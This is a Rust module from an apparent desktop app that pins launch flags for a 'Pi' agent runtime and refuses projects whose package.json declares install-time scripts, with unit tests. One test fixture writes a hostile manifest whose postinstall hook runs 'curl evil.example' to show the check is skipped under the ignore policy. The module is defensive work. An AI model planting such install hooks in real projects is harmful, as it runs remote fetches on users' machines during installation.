//! session/adapter/pi/resources.rs — pi-skills-capabilities FR-5/FR-6/FR-7:
//! `RuntimeResourcePolicy` (mirrors contract/common.ts), the ONE mapping
//! from that policy to Pi's launch argv (`process::pi_args` is the ONE call
//! site), the FR-7 preflight that refuses a project whose own package
//! manifest could execute installation helpers despite the flags, and the
//! `get_commands` wire mapping → the neutral `RuntimeCommandInfo` vocabulary
//! `adapter::mod` declares (`session::skills`/`session::slash` project that
//! onto their own `SkillInfo`/`SlashCommandInfo` shapes).
//!
//! **Provisional.** Same caveat every other Pi wire assumption in this
//! adapter carries (see `wire.rs`'s own doc): no real capture of
//! `get_commands`'s response exists yet. `parse_get_commands_response` is
//! this feature's best-effort mirror — `{ commands: [ { invocation,
//! description, source, sourcePath, loaded, unavailableReason }, ... ] }` —
//! kept in ONE function so a later certification pass reconciles it in one
//! place. The `--no-extensions`/`--no-approve` flag spellings themselves are
//! equally provisional (carried over from `process::pi_args`, which owned
//! them before this module existed).

use crate::ipc::{AppError, ErrorCode};
use crate::session::adapter::{RuntimeCommandInfo, RuntimeCommandSource};
use serde::{Deserialize, Serialize};
use serde_json::Value;

// ---------------------------------------------------------------- the policy type

/// Mirrors contract/common.ts `RuntimeResourcePolicy` — the launch policy a
/// Pi session is pinned to at creation and never converts into an allow/deny
/// tool rule (FR-5).
///
/// `pub`, not `pub(crate)` (pi-models-metrics's own precedent on
/// `RuntimeModelRef`): `session_create` is a `pub fn` (Tauri's
/// `generate_handler!` in main.rs, an external crate relative to this lib,
/// names it), and a `pub fn` may not expose a less-visible type in its own
/// signature (`resourcePolicy: Option<RuntimeResourcePolicy>`).
#[derive(Clone, Copy, Debug, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
pub struct RuntimeResourcePolicy {
    pub(crate) project_resources: ProjectResources,
    pub(crate) extensions: ExtensionsPolicy,
    pub(crate) acknowledged_unrestricted_tools: bool,
}

/// Mirrors contract `RuntimeResourcePolicy.projectResources`.
#[derive(Clone, Copy, Debug, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "lowercase")]
pub(crate) enum ProjectResources {
    Ignore,
    Allow,
}

/// Mirrors contract `RuntimeResourcePolicy.extensions` — a one-member
/// literal type on purpose (FR-6: arbitrary Pi extensions are disabled in
/// this release; there is nothing else this field could ever say).
#[derive(Clone, Copy, Debug, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "lowercase")]
pub(crate) enum ExtensionsPolicy {
    Disabled,
}

// ---------------------------------------------------------------- FR-6/FR-7: policy -> argv

/// FR-6/FR-7: the two argv flags this policy controls, in this order.
/// `--no-extensions` is unconditional — arbitrary Pi extensions stay
/// disabled in this release, never relaxed by any policy value. `--no-
/// approve` is dropped ONLY when the session explicitly opted into
/// `projectResources: 'allow'` — never by Pi's own ambient/global trust,
/// which this explicit launch policy overrides (FR-7's "default to ignored
/// … even if Pi's global trust is permissive").
pub(crate) fn policy_args(policy: &RuntimeResourcePolicy) -> Vec<String> {
    let mut args = vec!["--no-extensions".to_string()];
    if policy.project_resources != ProjectResources::Allow {
        args.push("--no-approve".to_string());
    }
    args
}

/// FR-7: refuse before spawning ANYTHING if the project's own package
/// manifest declares an install-time script — `--no-approve`/
/// `--no-extensions` gate Pi's OWN prompts, not what a package manager
/// would run on Pi's behalf if reading the project's configuration shells
/// out to one. Only checked when the session actually opted into reading
/// project resources (`projectResources: 'allow'`); `ignore` means Pi is
/// told not to load the project's configuration at all, so there is
/// nothing here that could execute.
///
/// PROVISIONAL / deliberately narrow: no certified capture says Pi ever
/// runs a package manager for a project's configuration. This is a
/// conservative, explainable refusal for the one concrete, well-known way
/// "reading project configuration" can execute arbitrary code in a Node
/// project (`package.json`'s `preinstall`/`install`/`postinstall`), not an
/// exhaustive audit of every possible project format — flagged in this
/// feature's own handoff.
pub(crate) fn resources_preflight(
    cwd: &str,
    policy: &RuntimeResourcePolicy,
) -> Result<(), AppError> {
    if policy.project_resources != ProjectResources::Allow {
        return Ok(());
    }
    let manifest_path = std::path::Path::new(cwd).join("package.json");
    let Ok(bytes) = std::fs::read(&manifest_path) else {
        return Ok(());
    };
    let Ok(manifest) = serde_json::from_slice::<Value>(&bytes) else {
        return Ok(());
    };
    let installer_scripts: Vec<&str> = ["preinstall", "install", "postinstall"]
        .into_iter()
        .filter(|name| {
            manifest
                .get("scripts")
                .and_then(|s| s.get(*name))
                .and_then(Value::as_str)
                .is_some_and(|s| !s.trim().is_empty())
        })
        .collect();
    if installer_scripts.is_empty() {
        return Ok(());
    }
    Err(AppError::new(
        ErrorCode::InvalidInput,
        format!(
            "this project's package.json declares install scripts ({}) that could run when its \
             configuration is read — allowing project resources for this project is not supported",
            installer_scripts.join(", ")
        ),
    ))
}

/// The ONE call site `process::pi_args` makes into this module: run FR-7's
/// preflight, then return FR-6's policy-derived flags — kept together so
/// argv can never be built without the preflight having run first.
pub(crate) fn resolve_launch_args(
    policy: &RuntimeResourcePolicy,
    cwd: &str,
) -> Result<Vec<String>, AppError> {
    resources_preflight(cwd, policy)?;
    Ok(policy_args(policy))
}

// ---------------------------------------------------------------- get_commands mapping

/// PROVISIONAL wire shape — see this module's own doc.
#[derive(Deserialize)]
struct RawCommand {
    invocation: Option<String>,
    #[serde(default)]
    description: String,
    source: Option<String>,
    #[serde(rename = "sourcePath")]
    source_path: Option<String>,
    #[serde(default)]
    loaded: bool,
    #[serde(rename = "unavailableReason")]
    unavailable_reason: Option<String>,
}

/// FR-1: `get_commands` is authoritative for loaded skills/templates — this
/// is the ONE place a raw response is read. A row with no non-blank
/// `invocation` is dropped rather than guessed at: `invocation` is the one
/// field FR-1 requires to preserve exact spelling, and nothing here rebuilds
/// it from a name.
pub(crate) fn parse_get_commands_response(data: Option<&Value>) -> Vec<RuntimeCommandInfo> {
    let Some(rows) = data
        .and_then(|d| d.get("commands"))
        .and_then(Value::as_array)
    else {
        return Vec::new();
    };
    rows.iter()
        .filter_map(|row| {
            let raw: RawCommand = serde_json::from_value(row.clone()).ok()?;
            let invocation = raw.invocation.filter(|s| !s.trim().is_empty())?;
            Some(RuntimeCommandInfo {
                invocation,
                description: raw.description,
                source: match raw.source.as_deref() {
                    Some("prompt") => RuntimeCommandSource::Prompt,
                    _ => RuntimeCommandSource::Skill,
                },
                source_path: raw.source_path,
                loaded: raw.loaded,
                unavailable_reason: raw.unavailable_reason,
            })
        })
        .collect()
}

/// pi-skills-capabilities FR-1: the bare name a panel shows/searches —
/// derived from the runtime's own invocation, never the other way around.
/// `/skill:review` → `review`; `/summarize` → `summarize`; anything that
/// strips to empty falls back to the invocation itself (defensive only —
/// Pi is not expected to report a bare `/`).
pub(crate) fn skill_name_from_invocation(invocation: &str) -> String {
    let bare = invocation.strip_prefix('/').unwrap_or(invocation);
    let bare = bare.strip_prefix("skill:").unwrap_or(bare);
    if bare.is_empty() {
        invocation.to_string()
    } else {
        bare.to_string()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn policy(project_resources: ProjectResources) -> RuntimeResourcePolicy {
        RuntimeResourcePolicy {
            project_resources,
            extensions: ExtensionsPolicy::Disabled,
            acknowledged_unrestricted_tools: true,
        }
    }

    // ---------------------------------------------------------- policy serde

    #[test]
    fn policy_serializes_to_the_contract_shape() {
        let p = policy(ProjectResources::Allow);
        let v = serde_json::to_value(p).unwrap();
        assert_eq!(
            v,
            serde_json::json!({
                "projectResources": "allow",
                "extensions": "disabled",
                "acknowledgedUnrestrictedTools": true,
            })
        );
        let back: RuntimeResourcePolicy = serde_json::from_value(v).unwrap();
        assert_eq!(back, p);
    }

    // ---------------------------------------------------------- policy_args

    #[test]
    fn policy_args_always_locks_extensions_and_defaults_to_no_approve() {
        let args = policy_args(&policy(ProjectResources::Ignore));
        assert_eq!(args, vec!["--no-extensions", "--no-approve"]);
    }

    #[test]
    fn policy_args_drops_no_approve_only_when_project_resources_are_allowed() {
        let args = policy_args(&policy(ProjectResources::Allow));
        assert_eq!(args, vec!["--no-extensions"]);
    }

    // ---------------------------------------------------------- resources_preflight

    fn temp_project_dir(tag: &str) -> std::path::PathBuf {
        let dir = std::env::temp_dir().join(format!(
            "francois-pi-resources-{tag}-{}",
            crate::ids::uuid()
        ));
        std::fs::create_dir_all(&dir).unwrap();
        dir
    }

    #[test]
    fn preflight_never_touches_disk_when_project_resources_are_ignored() {
        // A malicious package.json is irrelevant when the policy never reads it.
        let dir = temp_project_dir("ignore");
        std::fs::write(
            dir.join("package.json"),
            r#"{"scripts":{"postinstall":"curl evil.example"}}"#,
        )
        .unwrap();
        assert!(
            resources_preflight(&dir.to_string_lossy(), &policy(ProjectResources::Ignore)).is_ok()
        );
        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn preflight_allows_a_project_with_no_manifest_at_all() {
        let dir = temp_project_dir("no-manifest");
        assert!(
            resources_preflight(&dir.to_string_lossy(), &policy(ProjectResources::Allow)).is_ok()
        );
        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn preflight_allows_a_manifest_with_no_install_scripts() {
        let dir = temp_project_dir("clean-manifest");
        std::fs::write(dir.join("package.json"), r#"{"scripts":{"test":"vitest"}}"#).unwrap();
        assert!(
            resources_preflight(&dir.to_string_lossy(), &policy(ProjectResources::Allow)).is_ok()
        );
        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn preflight_refuses_a_manifest_declaring_any_install_script() {
        for script in ["preinstall", "install", "postinstall"] {
            let dir = temp_project_dir(&format!("hostile-{script}"));
            std::fs::write(
                dir.join("package.json"),
                serde_json::json!({ "scripts": { script: "node ./setup.js" } }).to_string(),
            )
            .unwrap();
            let err = resources_preflight(&dir.to_string_lossy(), &policy(ProjectResources::Allow))
                .unwrap_err();
            assert_eq!(err.code, ErrorCode::InvalidInput);
            assert!(err.message.contains(script));
            std::fs::remove_dir_all(&dir).ok();
        }
    }

    #[test]
    fn resolve_launch_args_propagates_a_preflight_failure_before_returning_flags() {
        let dir = temp_project_dir("resolve-hostile");
        std::fs::write(
            dir.join("package.json"),
            r#"{"scripts":{"postinstall":"node ./setup.js"}}"#,
        )
        .unwrap();
        let err = resolve_launch_args(&policy(ProjectResources::Allow), &dir.to_string_lossy())
            .unwrap_err();
        assert_eq!(err.code, ErrorCode::InvalidInput);
        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn resolve_launch_args_returns_the_policy_flags_when_the_preflight_passes() {
        let dir = temp_project_dir("resolve-clean");
        let args =
            resolve_launch_args(&policy(ProjectResources::Ignore), &dir.to_string_lossy()).unwrap();
        assert_eq!(args, vec!["--no-extensions", "--no-approve"]);
        std::fs::remove_dir_all(&dir).ok();
    }

    // ---------------------------------------------------------- parse_get_commands_response

    #[test]
    fn parse_get_commands_response_is_empty_for_no_commands_key_or_an_empty_array() {
        assert_eq!(parse_get_commands_response(None), Vec::new());
        assert_eq!(
            parse_get_commands_response(Some(&serde_json::json!({}))),
            Vec::new()
        );
        assert_eq!(
            parse_get_commands_response(Some(&serde_json::json!({ "commands": [] }))),
            Vec::new()
        );
    }

    #[test]
    fn parse_get_commands_response_reads_skill_and_prompt_rows() {
        let data = serde_json::json!({
            "commands": [
                {
                    "invocation": "/skill:review",
                    "description": "review a diff",
                    "source": "skill",
                    "sourcePath": "/repo/.pi/skills/review",
                    "loaded": true,
                },
                {
                    "invocation": "/summarize",
                    "description": "",
                    "source": "prompt",
                    "loaded": false,
                    "unavailableReason": "project resources are disabled for this session",
                },
            ]
        });
        let commands = parse_get_commands_response(Some(&data));
        assert_eq!(commands.len(), 2);
        assert_eq!(commands[0].invocation, "/skill:review");
        assert_eq!(commands[0].source, RuntimeCommandSource::Skill);
        assert!(commands[0].loaded);
        assert_eq!(
            commands[0].source_path.as_deref(),
            Some("/repo/.pi/skills/review")
        );
        assert_eq!(commands[1].invocation, "/summarize");
        assert_eq!(commands[1].source, RuntimeCommandSource::Prompt);
        assert!(!commands[1].loaded);
        assert_eq!(
            commands[1].unavailable_reason.as_deref(),
            Some("project resources are disabled for this session")
        );
    }

    #[test]
    fn parse_get_commands_response_drops_a_row_with_no_non_blank_invocation() {
        let data = serde_json::json!({
            "commands": [
                { "invocation": "", "source": "skill" },
                { "source": "skill" },
                { "invocation": "/ok", "source": "skill" },
            ]
        });
        let commands = parse_get_commands_response(Some(&data));
        assert_eq!(commands.len(), 1);
        assert_eq!(commands[0].invocation, "/ok");
    }

    // ---------------------------------------------------------- skill_name_from_invocation

    #[test]
    fn skill_name_from_invocation_strips_the_slash_and_skill_prefix() {
        assert_eq!(skill_name_from_invocation("/skill:review"), "review");
        assert_eq!(skill_name_from_invocation("/summarize"), "summarize");
        assert_eq!(skill_name_from_invocation("bare"), "bare");
    }

    #[test]
    fn skill_name_from_invocation_falls_back_to_itself_when_stripped_to_empty() {
        assert_eq!(skill_name_from_invocation("/"), "/");
    }
}
